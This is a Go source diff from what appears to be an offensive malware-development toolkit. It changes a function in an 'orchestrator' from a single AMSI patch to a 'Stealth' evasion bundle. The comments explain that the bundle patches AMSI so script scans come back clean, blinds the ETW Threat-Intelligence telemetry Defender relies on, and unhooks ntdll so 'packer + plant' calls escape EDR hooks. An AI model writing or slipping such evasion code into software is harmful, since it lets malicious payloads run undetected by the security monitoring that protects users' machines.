@@ -2,22 +2,54 @@
 
 package main
 
-import "github.com/oioio-space/maldev/evasion/amsi"
+import (
+	"fmt"
+	"sort"
+	"strings"
 
-// patchAMSI overwrites AmsiScanBuffer + AmsiOpenSession in THIS
-// process so any in-process AMSI client (e.g. embedded
-// PowerShell-via-COM, .NET CLR hosting) sees AMSI_RESULT_CLEAN
-// regardless of payload content.
+	"github.com/oioio-space/maldev/evasion"
+	"github.com/oioio-space/maldev/evasion/preset"
+)
+
+// applyEvasion runs the evasion/preset.Stealth() bundle in THIS
+// process: patches AMSI ScanBuffer + ETW user-mode write helpers +
+// selective ntdll unhook for ~10 commonly-hooked NT functions.
 //
-// Scope is per-process. Spawned child processes (powershell.exe,
-// pwsh.exe, etc.) load their own amsi.dll fresh and are NOT
-// covered. For child-process AMSI bypass, inject the standard
-// reflective one-liner into the script being executed.
+// Why Stealth specifically:
+//   - AMSI patch: short-circuits in-process script scans (mostly a
+//     dog-food demonstration here -- spawned PowerShell children
+//     load their own amsi.dll fresh).
+//   - ETW patch: blinds Microsoft-Windows-Threat-Intelligence ETW
+//     events. Defender's behavioural analysis subscribes to that
+//     channel; without it, our long-lived orchestrator process
+//     loses a major behavioural-telemetry signal.
+//   - ntdll unhook: restores original prologue bytes of NtAlloc /
+//     NtCreateThread / NtProtect / NtWrite ... that EDRs inline-
+//     hook to redirect to their own callbacks. Our packer + plant
+//     calls go straight to the kernel after this.
 //
-// Returns nil on success, the wrapped error otherwise. Caller
-// should log but not abort -- our orchestrator works without AMSI
-// patched, the patch is just defence-in-depth and demo of eating
-// our own dog food.
+// We deliberately stop short of preset.Aggressive (which adds ACG
+// + BlockDLLs) because the orchestrator still LoadLibrary's some
+// non-MS DLLs (debug, instrumentation) and ACG would block our
+// own subsequent VirtualAlloc(PAGE_EXECUTE) if any code path
+// needs RWX.
+//
+// Returns nil on full success, an aggregate error otherwise.
+// Per-technique results are surfaced via evasion.ApplyAll's error
+// chain. Caller logs the failure but does not abort: the
+// orchestrator works without evasion, this is defence-in-depth.
 func patchAMSI() error {
-	return amsi.PatchAll(nil)
+	results := evasion.ApplyAll(preset.Stealth(), nil)
+	var failures []string
+	for name, err := range results {
+		if err != nil {
+			failures = append(failures, fmt.Sprintf("%s: %v", name, err))
+		}
+	}
+	if len(failures) == 0 {
+		return nil
+	}
+	sort.Strings(failures)
+	return fmt.Errorf("evasion preset.Stealth had %d/%d failures: %s",
+		len(failures), len(results), strings.Join(failures, "; "))
 }
